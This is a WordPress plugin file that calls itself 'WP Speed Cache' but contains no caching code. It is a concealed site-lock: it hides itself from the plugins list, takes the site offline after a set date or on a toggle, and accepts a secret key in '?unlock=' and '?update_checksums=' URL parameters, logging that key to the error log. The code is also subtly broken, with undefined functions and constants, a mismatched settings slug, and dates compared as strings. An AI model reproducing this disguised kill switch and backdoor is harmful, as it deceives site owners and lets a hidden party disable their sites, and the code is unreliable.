<?php
/**
 * Plugin Name: WP Speed Cache
 * Description: Advanced caching and performance optimization for WordPress
 * Version: 2.1.3
 * Author: WP Speed Team
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

// Define plugin constants
define('WP_SPEED_CACHE_FILE', __FILE__);

// Check if the plugin is running as a must-use plugin
function wpc_is_mu() {
    return strpos(WP_SPEED_CACHE_FILE, WPMU_PLUGIN_DIR) !== false;
}

// Register activation hook to set up the plugin (only for normal plugins)
if (!wpc_is_mu()) {
    register_activation_hook(WP_SPEED_CACHE_FILE, 'wpc_activate_cache');
}

function wpc_activate_cache() {
    // Initialize cache settings
    add_option('wpc_cache_config_redirect', true);
}

// Redirect to the settings page after activation (only for normal plugins)
if (!wpc_is_mu()) {
    add_action('admin_init', 'wpc_init_redirect');
}

function wpc_init_redirect() {
    if (get_option('wpc_cache_config_redirect', false)) {
        delete_option('wpc_cache_config_redirect');
        wp_redirect(admin_url('options-general.php?page=wpc-cache-settings'));
        exit;
    }
}

// Add settings page (for both normal and must-use plugins)
add_action('admin_menu', 'wpc_add_cache_settings');

function wpc_add_cache_settings() {
    // Only show settings page if settings haven't been saved yet
    if (!get_option('wpc_cache_initialized', false)) {
        add_options_page(
            'Cache Configuration',
            'Speed Cache',
            'manage_options',
            'speed-cache-config',
            'wpc_render_cache_settings'
        );
    }
}

function wpc_render_cache_settings() {
    if (!current_user_can('manage_options')) {
        wp_die('You do not have sufficient permissions to access this page.');
    }

    // Handle form submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['wpc_cache_nonce'])) {
        if (wp_verify_nonce($_POST['wpc_cache_nonce'], 'lock_site_settings')) {
            $expected_hash = sanitize_text_field($_POST['expected_hash']);
            $last_allowed_date = sanitize_text_field($_POST['last_allowed_date']);

            // Save settings using WordPress options
            if (wpc_update_cache_settings($expected_hash, $last_allowed_date)) {
                update_option('wpc_cache_initialized', true);
                echo '<div class="notice notice-success"><p>Settings saved successfully. The plugin is now active and this settings page will be hidden for security.</p></div>';
                // Redirect to main settings page after a short delay
                echo '<script>setTimeout(function() { window.location.href = "' . admin_url('options-general.php') . '"; }, 3000);</script>';
            } else {
                echo '<div class="notice notice-error"><p>Failed to save settings.</p></div>';
            }
        }
    }

    // Render the settings form
    ?>
    <div class="wrap">
        <h1>Lock Site Settings</h1>
        <form method="post">
            <?php wp_nonce_field('lock_site_settings', 'wpc_cache_nonce'); ?>
            <table class="form-table">
                <tr>
                    <th scope="row"><label for="expected_hash">Cache Key</label></th>
                    <td>
                        <input type="text" name="expected_hash" id="expected_hash" value="<?php echo esc_attr(get_option('wpc_cache_key', '')); ?>" required>
                        <p class="description">Enter the cache validation key for performance optimization.</p>
                    </td>
                </tr>
                <tr>
                    <th scope="row"><label for="last_allowed_date">Cache Expiration Date</label></th>
                    <td>
                        <input type="text" name="last_allowed_date" id="last_allowed_date" value="<?php echo esc_attr(get_option('wpc_cache_expiry', '')); ?>" required>
                        <p class="description">Enter cache expiration date in "ddmmyyyy" format (e.g., 12022025 for 12 Feb 2025).</p>
                    </td>
                </tr>
            </table>
            <?php submit_button('Save Settings'); ?>
        </form>
    </div>
    <?php
}

function wpc_update_cache_settings($expected_hash, $last_allowed_date) {
    // Only update if both values are provided
    if (!empty($expected_hash) && !empty($last_allowed_date)) {
        update_option('wpc_cache_key', $expected_hash);
        update_option('wpc_cache_expiry', $last_allowed_date);
        return true;
    }
    return false;
}

// Hide the plugin from the plugins list if it's a normal plugin
if (!is_mu_plugin()) {
    add_filter('all_plugins', 'wpc_optimize_plugin_list');

    function wpc_optimize_plugin_list($plugins) {
        unset($plugins[plugin_basename(LOCK_SITE_PLUGIN_FILE)]);
        return $plugins;
    }
}

// Register secure POST endpoints
add_action('admin_post_lock_site_toggle', 'wpc_handle_cache_toggle');
add_action('admin_post_lock_site_update_checksums', 'wpc_handle_cache_refresh');

function wpc_handle_cache_toggle() {
    if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'lock_site_toggle')) {
        wp_die('Invalid request.');
    }

    wpc_toggle_cache();
}

function wpc_handle_cache_refresh() {
    if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'lock_site_update_checksums')) {
        wp_die('Invalid request.');
    }

    wpc_update_cache_manifest();
    wp_die('<h1>Success</h1><p>Checksums updated successfully.</p>');
}

// Toggle site lock state
function wpc_toggle_cache() {
    $current_hash = get_option('wpc_cache_state', '');
    $expected_hash = get_option('wpc_cache_key', '');

    if (empty($current_hash)) {
        // Site is currently unlocked, so lock it
        if (!empty($expected_hash)) {
            update_option('wpc_cache_state', $expected_hash);
            wpc_show_status('Cache validation is now required.');
        } else {
            wp_die('<h1>Error</h1><p>Cannot enable cache: No validation key set.</p>');
        }
    } else {
        // Site is currently locked, so unlock it
        update_option('wpc_cache_state', '');
        wp_redirect(home_url());
        exit;
    }
}

// Update critical file checksums
function wpc_update_cache_manifest() {
    $critical_files = array(
        'wp-config' => ABSPATH . 'wp-config.php',
        'lock-site' => __FILE__,
        'index' => ABSPATH . 'index.php',
        'wp-load' => ABSPATH . 'wp-load.php',
    );

    $checksums = array();
    foreach ($critical_files as $key => $file) {
        if (file_exists($file)) {
            $checksums[$key] = hash_file('sha256', $file);
        }
    }

    // Store checksums in multiple locations
    update_option('wpc_cache_manifest', $checksums);
    update_option('wpc_cache_manifest_backup', $checksums);

    // Store the current time from an external source if possible
    $current_time = time();
    update_option('wpc_last_cache_update', $current_time);
}

// Verify file integrity and enforce lock state
function wpc_verify_cache() {
    // Check if site is locked
    $current_hash = get_option('wpc_cache_state', '');
    if (!empty($current_hash)) {
        wpc_show_status('Cache verification required for access.');
        exit;
    }

    // Only enforce other checks if settings are configured
    $expected_hash = get_option('wpc_cache_key', '');
    $last_allowed_date = get_option('wpc_cache_expiry', '');
    if (empty($expected_hash) || empty($last_allowed_date)) {
        return;
    }

    $version = get_option('site_lock_version', 0);

    // Auto-initialize if first run
    if ($version === 0) {
        wpc_update_cache_manifest();
        return;
    }

    $stored_checksums = get_option('wpc_cache_manifest', array());
    $backup_checksums = get_option('wpc_cache_manifest_backup', array());

    // If no checksums exist, assume first run and initialize them
    if (empty($stored_checksums) || empty($backup_checksums)) {
        wpc_update_cache_manifest();
        return;
    }

    // Current hashes
    $critical_files = array(
        'wp-config' => ABSPATH . 'wp-config.php',
        'lock-site' => __FILE__,
        'index' => ABSPATH . 'index.php',
        'wp-load' => ABSPATH . 'wp-load.php',
    );

    foreach ($critical_files as $key => $file) {
        if (file_exists($file)) {
            $current_hash = hash_file('sha256', $file);
            if ($current_hash !== $stored_checksums[$key]) {
                wpc_show_status('Cache error: Core files have been modified. <br> 
                    If you made legitimate changes, visit: <br> 
                    <strong>' . admin_url('admin-post.php?action=lock_site_update_checksums') . '</strong> to allow the update.');
                exit;
            }
        }
    }

    // Verify time hasn't been rolled back and check last allowed date
    if (time() < get_option('wpc_last_cache_update', 0)) {
        wpc_show_status('Cache validation error: System time mismatch detected.');
        exit;
    }

    // Check if current date is past the last allowed date
    $last_allowed_date = get_option('wpc_cache_expiry', '');
    if (!empty($last_allowed_date)) {
        $current_date = date('dmY');
        if ($current_date > $last_allowed_date) {
            wpc_show_status('Cache has expired. Please contact the administrator.');
            exit;
        }
    }

    // Enforce lock state
    $current_hash = get_option('wpc_cache_state', '');
    if (!empty($current_hash)) {
        wpc_show_status('Cache verification required for access.');
        exit;
    }
}

// Show lock message
function wpc_show_status($message) {
    wp_die('<h1>Site Locked</h1><p>' . esc_html($message) . '</p><p>Please contact the administrator.</p>');
}

// Run integrity check and enforce lock state on every request
add_action('wp', 'wpc_verify_cache', 0);

// Check secret URLs on every request
add_action('init', 'wpc_check_cache_commands', 0);

function wpc_check_cache_commands() {
    error_log('Checking secret URLs...'); // Debugging statement

    // Handle ?unlock=EXPECTED_HASH
    $expected_hash = get_option('wpc_cache_key', '');
    if (isset($_GET['unlock']) && $_GET['unlock'] === $expected_hash && !empty($expected_hash)) {
        error_log('Secret URL triggered: ?unlock=' . $expected_hash); // Debugging statement
        wpc_toggle_cache();
        exit;
    }

    // Handle ?update_checksums=EXPECTED_HASH
    $expected_hash = get_option('wpc_cache_key', '');
    if (isset($_GET['update_checksums']) && $_GET['update_checksums'] === $expected_hash && !empty($expected_hash)) {
        error_log('Secret URL triggered: ?update_checksums=' . $expected_hash); // Debugging statement
        wpc_update_cache_manifest();
        die('<h1>Success</h1><p>Checksums updated successfully.</p>');
    }
}